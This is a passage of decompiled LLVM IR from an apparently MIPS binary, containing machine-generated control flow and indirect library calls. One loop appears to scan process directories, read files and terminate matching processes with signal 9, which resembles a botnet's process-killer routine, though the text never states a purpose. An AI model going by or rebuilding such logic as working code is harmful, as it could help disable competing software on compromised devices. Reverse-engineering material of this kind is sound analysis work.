dec_label_pc_40175c:                              ; preds = %dec_label_pc_4015c4, %dec_label_pc_40151c, %dec_label_pc_401610, %dec_label_pc_401710, %dec_label_pc_4016e0, %dec_label_pc_40173c
  %v3_40175c = load i32, i32* inttoptr (i32 2036987087 to i32*), align 4
  store i32 %v3_40175c, i32* %t9.global-to-local, align 4
  store i32 %v2_401480, i32* %a0.global-to-local, align 4
  store i32 512, i32* %a1.global-to-local, align 4
  %v1_401768 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_401768, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40175c)
  %v0_401774 = load i32, i32* %v0.global-to-local, align 4
  %v1_401774 = icmp eq i32 %v0_401774, 0
  store i32 0, i32* @v1, align 4
  br i1 %v1_401774, label %dec_label_pc_401778, label %dec_label_pc_4015c0

dec_label_pc_401778:                              ; preds = %dec_label_pc_40175c
  %v3_40177c = load i32, i32* inttoptr (i32 2036986599 to i32*), align 4
  store i32 %v3_40177c, i32* %t9.global-to-local, align 4
  %v1_401784 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_401784, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40177c)
  %v3_401794 = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_401794, i32* %t9.global-to-local, align 4
  store i32 %v2_401498, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401794)
  %v0_4017a8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4017a8 = icmp eq i32 %v0_4017a8, 0
  br i1 %v1_4017a8, label %dec_label_pc_4017ac, label %dec_label_pc_401814

dec_label_pc_4017ac:                              ; preds = %dec_label_pc_401778
  %v3_4017b0 = load i32, i32* inttoptr (i32 2036986975 to i32*), align 4
  store i32 %v3_4017b0, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4017b0)
  %v3_4017c8 = load i32, i32* inttoptr (i32 2036986975 to i32*), align 4
  store i32 %v3_4017c8, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4017c8)
  %v3_4017e0 = load i32, i32* inttoptr (i32 2036986975 to i32*), align 4
  store i32 %v3_4017e0, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4017e0)
  %v3_4017f8 = load i32, i32* inttoptr (i32 2036986975 to i32*), align 4
  store i32 %v3_4017f8, i32* %t9.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4017f8)
  store i32 0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_401814

dec_label_pc_401814:                              ; preds = %dec_label_pc_401778, %dec_label_pc_4017ac
  %v3_401814 = load i32, i32* inttoptr (i32 2036987099 to i32*), align 4
  store i32 %v3_401814, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401814)
  %v3_40182c = load i32, i32* inttoptr (i32 2036986775 to i32*), align 4
  store i32 %v3_40182c, i32* %t9.global-to-local, align 4
  %v1_401834 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_401834, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40182c)
  %v0_401840 = load i32, i32* %v0.global-to-local, align 4
  %v1_401840 = icmp eq i32 %v0_401840, 0
  store i32 %v0_401840, i32* %s6.global-to-local, align 4
  br i1 %v1_401840, label %dec_label_pc_401844, label %dec_label_pc_401850

dec_label_pc_401844:                              ; preds = %dec_label_pc_401814
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_401850

dec_label_pc_401850:                              ; preds = %dec_label_pc_401814, %dec_label_pc_401844
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_401858.pre = load i32, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_401858

dec_label_pc_401858:                              ; preds = %dec_label_pc_401bfc, %dec_label_pc_401850
  %v2_40186c = phi i32 [ %v0_401c10, %dec_label_pc_401bfc ], [ %v0_401858.pre, %dec_label_pc_401850 ]
  %v1_401858 = add i32 %v2_40186c, 11
  %v2_401858 = inttoptr i32 %v1_401858 to i8*
  %v3_401858 = load i8, i8* %v2_401858, align 1
  %v4_401858 = zext i8 %v3_401858 to i32
  %v1_401860 = add nuw nsw i32 %v4_401858, 208
  %v1_401864 = and i32 %v1_401860, 254
  %v1_401868 = icmp ult i32 %v1_401864, 10
  %v2_401868 = zext i1 %v1_401868 to i32
  store i32 %v2_401868, i32* %v0.global-to-local, align 4
  %v1_40186c = icmp eq i1 %v1_401868, false
  store i32 %v1_401858, i32* %s4.global-to-local, align 4
  br i1 %v1_40186c, label %dec_label_pc_401bfc, label %dec_label_pc_401870

dec_label_pc_401870:                              ; preds = %dec_label_pc_401858
  %v3_401874 = load i32, i32* inttoptr (i32 2036987099 to i32*), align 4
  store i32 %v3_401874, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401874)
  store i32 %v2_401458, i32* %s1.global-to-local, align 4
  %v3_40188c = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_40188c, i32* %t9.global-to-local, align 4
  %v0_401890 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401890, i32* %a1.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40188c)
  %v3_4018a4 = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_4018a4, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018a4)
  %v0_4018b8 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_4018b8, i32* %a1.global-to-local, align 4
  %v3_4018bc = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_4018bc, i32* %t9.global-to-local, align 4
  %v1_4018c4 = load i32, i32* %s1.global-to-local, align 4
  %v2_4018c4 = load i32, i32* %v0.global-to-local, align 4
  %v3_4018c4 = add i32 %v2_4018c4, %v1_4018c4
  store i32 %v3_4018c4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018bc)
  %v3_4018d4 = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_4018d4, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018d4)
  store i32 3, i32* %a0.global-to-local, align 4
  %v3_4018ec = load i32, i32* inttoptr (i32 2036987099 to i32*), align 4
  store i32 %v3_4018ec, i32* %t9.global-to-local, align 4
  %v1_4018f4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_4018f4, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4018ec)
  %v0_401900 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401900, i32* %a1.global-to-local, align 4
  %v3_401904 = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_401904, i32* %t9.global-to-local, align 4
  %v1_40190c = load i32, i32* %s1.global-to-local, align 4
  %v2_40190c = load i32, i32* %s0.global-to-local, align 4
  %v3_40190c = add i32 %v2_40190c, %v1_40190c
  store i32 %v3_40190c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401904)
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  %v3_40191c = load i32, i32* inttoptr (i32 2036987071 to i32*), align 4
  store i32 %v3_40191c, i32* %t9.global-to-local, align 4
  store i32 %v2_401468, i32* %a1.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40191c)
  store i32 -1, i32* @v1, align 4
  %v0_401934 = load i32, i32* %v0.global-to-local, align 4
  %v2_401934 = icmp eq i32 %v0_401934, -1
  br i1 %v2_401934, label %dec_label_pc_401bfc, label %dec_label_pc_401938

dec_label_pc_401938:                              ; preds = %dec_label_pc_401870
  %v3_40193c = load i32, i32* inttoptr (i32 2036987099 to i32*), align 4
  store i32 %v3_40193c, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40193c)
  %v0_401950 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401950, i32* %a1.global-to-local, align 4
  %v3_401954 = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_401954, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401954)
  %v3_40196c = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_40196c, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40196c)
  %v0_401980 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_401980, i32* %a1.global-to-local, align 4
  %v3_401984 = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_401984, i32* %t9.global-to-local, align 4
  %v1_40198c = load i32, i32* %s1.global-to-local, align 4
  %v2_40198c = load i32, i32* %v0.global-to-local, align 4
  %v3_40198c = add i32 %v2_40198c, %v1_40198c
  store i32 %v3_40198c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401984)
  %v3_40199c = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_40199c, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_40199c)
  store i32 5, i32* %a0.global-to-local, align 4
  %v3_4019b4 = load i32, i32* inttoptr (i32 2036987099 to i32*), align 4
  store i32 %v3_4019b4, i32* %t9.global-to-local, align 4
  %v1_4019bc = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_4019bc, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4019b4)
  %v0_4019c8 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_4019c8, i32* %a1.global-to-local, align 4
  %v3_4019cc = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_4019cc, i32* %t9.global-to-local, align 4
  %v1_4019d4 = load i32, i32* %s1.global-to-local, align 4
  %v2_4019d4 = load i32, i32* %s0.global-to-local, align 4
  %v3_4019d4 = add i32 %v2_4019d4, %v1_4019d4
  store i32 %v3_4019d4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4019cc)
  %v3_4019e4 = load i32, i32* inttoptr (i32 2036986775 to i32*), align 4
  store i32 %v3_4019e4, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4019e4)
  %v0_4019f8 = load i32, i32* %v0.global-to-local, align 4
  %v1_4019f8 = icmp eq i32 %v0_4019f8, 0
  store i32 %v0_4019f8, i32* %s2.global-to-local, align 4
  br i1 %v1_4019f8, label %dec_label_pc_401938.dec_label_pc_401a08_crit_edge, label %dec_label_pc_401ba4

dec_label_pc_401938.dec_label_pc_401a08_crit_edge: ; preds = %dec_label_pc_401938
  %v0_401a08.pre = load i32, i32* %t9.global-to-local, align 4
  br label %dec_label_pc_401a08

dec_label_pc_401a08:                              ; preds = %dec_label_pc_401938.dec_label_pc_401a08_crit_edge, %dec_label_pc_401ba4
  %v0_401a08 = phi i32 [ %v0_401a08.pre, %dec_label_pc_401938.dec_label_pc_401a08_crit_edge ], [ %v3_401bc4, %dec_label_pc_401ba4 ]
  call void @__pseudo_call(i32 %v0_401a08)
  %v3_401a18 = load i32, i32* inttoptr (i32 2036987099 to i32*), align 4
  store i32 %v3_401a18, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a18)
  %v0_401a2c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401a2c, i32* %a1.global-to-local, align 4
  %v3_401a30 = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_401a30, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a30)
  %v3_401a48 = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_401a48, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a48)
  %v0_401a5c = load i32, i32* %s4.global-to-local, align 4
  store i32 %v0_401a5c, i32* %a1.global-to-local, align 4
  %v3_401a60 = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_401a60, i32* %t9.global-to-local, align 4
  %v1_401a68 = load i32, i32* %s1.global-to-local, align 4
  %v2_401a68 = load i32, i32* %v0.global-to-local, align 4
  %v3_401a68 = add i32 %v2_401a68, %v1_401a68
  store i32 %v3_401a68, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a60)
  %v3_401a78 = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_401a78, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a78)
  store i32 5, i32* %a0.global-to-local, align 4
  %v3_401a90 = load i32, i32* inttoptr (i32 2036987099 to i32*), align 4
  store i32 %v3_401a90, i32* %t9.global-to-local, align 4
  %v1_401a98 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v1_401a98, i32* %s0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401a90)
  %v0_401aa4 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401aa4, i32* %a1.global-to-local, align 4
  %v3_401aa8 = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_401aa8, i32* %t9.global-to-local, align 4
  %v1_401ab0 = load i32, i32* %s1.global-to-local, align 4
  %v2_401ab0 = load i32, i32* %s0.global-to-local, align 4
  %v3_401ab0 = add i32 %v2_401ab0, %v1_401ab0
  store i32 %v3_401ab0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401aa8)
  %v3_401ac0 = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_401ac0, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401ac0)
  %v0_401ad4 = load i32, i32* %s1.global-to-local, align 4
  %v1_401ad4 = load i32, i32* %v0.global-to-local, align 4
  %v2_401ad4 = add i32 %v1_401ad4, %v0_401ad4
  store i32 %v2_401ad4, i32* %a0.global-to-local, align 4
  %v3_401ad8 = load i32, i32* inttoptr (i32 2036986439 to i32*), align 4
  store i32 %v3_401ad8, i32* %a1.global-to-local, align 4
  %v3_401adc = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_401adc, i32* %t9.global-to-local, align 4
  %v2_401ae4 = add i32 %v3_401ad8, -32072
  store i32 %v2_401ae4, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401adc)
  %v3_401af4 = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_401af4, i32* %t9.global-to-local, align 4
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401af4)
  %v0_401b08 = load i32, i32* %s1.global-to-local, align 4
  %v1_401b08 = load i32, i32* %v0.global-to-local, align 4
  %v2_401b08 = add i32 %v1_401b08, %v0_401b08
  store i32 %v2_401b08, i32* %a0.global-to-local, align 4
  %v3_401b0c = load i32, i32* inttoptr (i32 2036986695 to i32*), align 4
  store i32 %v3_401b0c, i32* %t9.global-to-local, align 4
  %v1_401b14 = load i32, i32* @s5, align 4
  %v2_401b14 = add i32 %v1_401b14, 11
  store i32 %v2_401b14, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401b0c)
  store i32 %v2_401458, i32* %a0.global-to-local, align 4
  %v3_401b24 = load i32, i32* inttoptr (i32 2036987071 to i32*), align 4
  store i32 %v3_401b24, i32* %t9.global-to-local, align 4
  store i32 %v2_401468, i32* %a1.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401b24)
  %v3_401b3c = load i32, i32* inttoptr (i32 2036986911 to i32*), align 4
  store i32 %v3_401b3c, i32* %t9.global-to-local, align 4
  %v0_401b40 = load i32, i32* %v0.global-to-local, align 4
  %v1_401b40 = load i32, i32* @s7, align 4
  %v2_401b40 = icmp eq i32 %v0_401b40, %v1_401b40
  store i32 %v2_401468, i32* %a0.global-to-local, align 4
  br i1 %v2_401b40, label %dec_label_pc_401ba4, label %dec_label_pc_401b44

dec_label_pc_401b44:                              ; preds = %dec_label_pc_401a08
  call void @__pseudo_call(i32 %v3_401b3c)
  store i32 %v2_401468, i32* %a0.global-to-local, align 4
  %v3_401b58 = load i32, i32* inttoptr (i32 2036987127 to i32*), align 4
  store i32 %v3_401b58, i32* %t9.global-to-local, align 4
  %v0_401b5c = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401b5c, i32* %a1.global-to-local, align 4
  store i32 %v2_401498, i32* %a2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401b58)
  store i32 10, i32* %a1.global-to-local, align 4
  %v3_401b70 = load i32, i32* inttoptr (i32 2036987023 to i32*), align 4
  store i32 %v3_401b70, i32* %t9.global-to-local, align 4
  %v0_401b74 = load i32, i32* %v0.global-to-local, align 4
  %v1_401b74 = load i32, i32* @s7, align 4
  %v2_401b74 = icmp eq i32 %v0_401b74, %v1_401b74
  %v3_401b74 = load i32, i32* %s4.global-to-local, align 4
  store i32 %v3_401b74, i32* %a0.global-to-local, align 4
  br i1 %v2_401b74, label %dec_label_pc_401ba4, label %dec_label_pc_401b78

dec_label_pc_401b78:                              ; preds = %dec_label_pc_401b44
  store i32 1, i32* %fp.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401b70)
  %v0_401b88 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401b88, i32* %a0.global-to-local, align 4
  %v3_401b8c = load i32, i32* inttoptr (i32 2036986943 to i32*), align 4
  store i32 %v3_401b8c, i32* %t9.global-to-local, align 4
  store i32 9, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401b8c)
  br label %dec_label_pc_401ba4

dec_label_pc_401ba4:                              ; preds = %dec_label_pc_401938, %dec_label_pc_401b44, %dec_label_pc_401a08, %dec_label_pc_401b78
  %v3_401ba4 = load i32, i32* inttoptr (i32 2036987027 to i32*), align 4
  store i32 %v3_401ba4, i32* %t9.global-to-local, align 4
  %v1_401bac = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_401bac, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401ba4)
  store i32 %v2_401458, i32* %s1.global-to-local, align 4
  %v0_401bc0 = load i32, i32* %v0.global-to-local, align 4
  store i32 %v0_401bc0, i32* @s5, align 4
  %v3_401bc4 = load i32, i32* inttoptr (i32 2036987091 to i32*), align 4
  store i32 %v3_401bc4, i32* %t9.global-to-local, align 4
  store i32 4096, i32* %a2.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 %v2_401468, i32* %a0.global-to-local, align 4
  %v1_401bd4 = icmp ne i32 %v0_401bc0, 0
  store i32 -1, i32* @s7, align 4
  %v0_401bdc = load i32, i32* %fp.global-to-local, align 4
  %v1_401bdc = icmp eq i32 %v0_401bdc, 0
  %or.cond = and i1 %v1_401bd4, %v1_401bdc
  br i1 %or.cond, label %dec_label_pc_401a08, label %dec_label_pc_401be4

dec_label_pc_401be4:                              ; preds = %dec_label_pc_401ba4
  %v3_401be4 = load i32, i32* inttoptr (i32 2036986615 to i32*), align 4
  store i32 %v3_401be4, i32* %t9.global-to-local, align 4
  %v1_401bec = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_401bec, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401be4)
  br label %dec_label_pc_401bfc

dec_label_pc_401bfc:                              ; preds = %dec_label_pc_401870, %dec_label_pc_401858, %dec_label_pc_401be4
  %v3_401bfc = load i32, i32* inttoptr (i32 2036987027 to i32*), align 4
  store i32 %v3_401bfc, i32* %t9.global-to-local, align 4
  %v1_401c04 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_401c04, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401bfc)
  %v0_401c10 = load i32, i32* %v0.global-to-local, align 4
  %v1_401c10 = icmp ne i32 %v0_401c10, 0
  store i32 %v0_401c10, i32* %a0.global-to-local, align 4
  %v0_401c18 = load i32, i32* %fp.global-to-local, align 4
  %v1_401c18 = icmp eq i32 %v0_401c18, 0
  %or.cond2 = and i1 %v1_401c10, %v1_401c18
  br i1 %or.cond2, label %dec_label_pc_401858, label %dec_label_pc_401c20

dec_label_pc_401c20:                              ; preds = %dec_label_pc_401bfc
  %v3_401c20 = load i32, i32* inttoptr (i32 2036986615 to i32*), align 4
  store i32 %v3_401c20, i32* %t9.global-to-local, align 4
  %v1_401c28 = load i32, i32* %s6.global-to-local, align 4
  store i32 %v1_401c28, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401c20)
  %v3_401c38 = load i32, i32* inttoptr (i32 2036987055 to i32*), align 4
  store i32 %v3_401c38, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401c38)
  %v3_401c50 = load i32, i32* inttoptr (i32 2036986975 to i32*), align 4
  store i32 %v3_401c50, i32* %t9.global-to-local, align 4
  store i32 1, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401c50)
  %v3_401c68 = load i32, i32* inttoptr (i32 2036986975 to i32*), align 4
  store i32 %v3_401c68, i32* %t9.global-to-local, align 4
  store i32 3, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401c68)
  %v3_401c80 = load i32, i32* inttoptr (i32 2036986975 to i32*), align 4
  store i32 %v3_401c80, i32* %t9.global-to-local, align 4
  store i32 5, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401c80)
  %v3_401c98 = load i32, i32* inttoptr (i32 2036986975 to i32*), align 4
  store i32 %v3_401c98, i32* %t9.global-to-local, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_401c98)
  %v0_401ca8 = load i32, i32* %fp.global-to-local, align 4
  %v1_401ca8 = mul i32 %v0_401ca8, 16777216
  %v1_401cb0 = sdiv i32 %v1_401ca8, 16777216
  store i32 %v1_401cb0, i32* %v0.global-to-local, align 4
  store i32 %v0_401420, i32* @ra, align 4
  store i32 %v0_401428, i32* @s7, align 4
  store i32 %v0_401430, i32* @s5, align 4
  store i32 %v0_401438, i32* @s3, align 4
  store i32 %v0_401440, i32* @s1, align 4
  store i32 %v0_401444, i32* @s0, align 4
  ret i32 %v1_401cb0

; uselistorder directives
  uselistorder i32 %v1_401cb0, { 1, 0 }
  uselistorder i32 %v0_401c10, { 1, 2, 0 }
  uselistorder i32 %v3_401bc4, { 1, 0 }
  uselistorder i32 %v4_401704, { 1, 0 }
  uselistorder i32 %v3_4016fc, { 1, 0 }
  uselistorder i32 %v0_4016f4, { 1, 0 }
  uselistorder i32 %v1_401718, { 1, 0, 2 }
  uselistorder i32 %v3_4016d8, { 0, 2, 1 }
  uselistorder i32 %v3_4016d0, { 1, 0 }
  uselistorder i32 %v0_4016e020, { 1, 0 }
  uselistorder i32 %v0_4016b0, { 1, 0 }
  uselistorder i32 %v0_4016e022, { 1, 0 }
  uselistorder i32 %v2_4016d8, { 2, 3, 0, 1 }
  uselistorder i32 %v0_4016b015, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v4_401604, { 1, 0 }
  uselistorder i32 %v3_4015fc, { 1, 0 }
  uselistorder i32 %v0_4015f4, { 1, 0 }
  uselistorder i32 %v2_4015e8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_4015e4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_4015d8, { 1, 0 }
  uselistorder i32 %v3_4015d8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_4014c0, { 1, 0 }
  uselistorder i32 %v2_401498, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_401480, { 3, 4, 0, 5, 1, 2, 6, 7 }
  uselistorder i8* %stack_var_-8768, { 1, 0 }
  uselistorder i32* %v1.global-to-local, { 8, 9, 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32* %v0.global-to-local, { 0, 1, 2, 3, 4, 5, 18, 19, 20, 21, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 23, 75, 76, 24, 77, 78, 68, 69, 70, 71, 72, 73, 74, 79, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32* %t9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 63, 64, 65, 66, 67, 68, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32* %s4.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32* %s1.global-to-local, { 0, 6, 7, 8, 1, 2, 3, 4, 5, 9, 17, 12, 10, 11, 13, 14, 15, 16 }
  uselistorder i32* %s0.global-to-local, { 8, 9, 0, 1, 2, 3, 10, 11, 12, 4, 5, 6, 7 }
  uselistorder i32* %fp.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %a2.global-to-local, { 0, 1, 36, 2, 37, 38, 39, 40, 42, 43, 3, 4, 41, 5, 6, 8, 7, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %a1.global-to-local, { 0, 1, 2, 3, 48, 49, 50, 51, 52, 53, 4, 5, 6, 7, 8, 9, 10, 11, 54, 55, 56, 58, 12, 57, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 37, 36, 38, 39, 40, 41, 42, 44, 43, 45, 46, 47 }
  uselistorder i32* %a0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 84, 85, 86, 87, 88, 90, 89, 91, 93, 92, 14, 15, 16, 18, 17, 19, 21, 20, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 94, 95, 96, 97, 98, 99, 100, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83 }
  uselistorder i32* inttoptr (i32 2036987071 to i32*), { 1, 0 }
  uselistorder i32* inttoptr (i32 2036986775 to i32*), { 1, 0 }
  uselistorder i32* inttoptr (i32 2036986975 to i32*), { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder i32* inttoptr (i32 2036986695 to i32*), { 10, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1, 11 }
  uselistorder i32* inttoptr (i32 2036987099 to i32*), { 7, 6, 5, 4, 3, 0, 1, 2 }
  uselistorder i32* inttoptr (i32 2036986759 to i32*), { 2, 1, 0, 3 }
  uselistorder i32* inttoptr (i32 2036986911 to i32*), { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 1, 2 }
  uselistorder i32* inttoptr (i32 2036986811 to i32*), { 3, 2, 1, 0 }
  uselistorder i32 23, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i32 (i32, i32, i32)* @function_401050, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_401bfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_401ba4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_401a08, { 1, 0 }
  uselistorder label %dec_label_pc_401850, { 1, 0 }
  uselistorder label %dec_label_pc_401814, { 1, 0 }
  uselistorder label %dec_label_pc_40175c, { 5, 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_401710, { 1, 0 }
  uselistorder label %dec_label_pc_4016c8, { 1, 0 }
  uselistorder label %dec_label_pc_4016b0, { 1, 0 }
  uselistorder label %dec_label_pc_4016ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_4016a4, { 1, 0 }
  uselistorder label %dec_label_pc_401610, { 1, 0 }
  uselistorder label %dec_label_pc_4015c0, { 1, 0 }
  uselistorder label %dec_label_pc_40151c, { 1, 0 }
}

define i32 @function_401ce4() local_unnamed_addr {
dec_label_pc_401ce4:
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
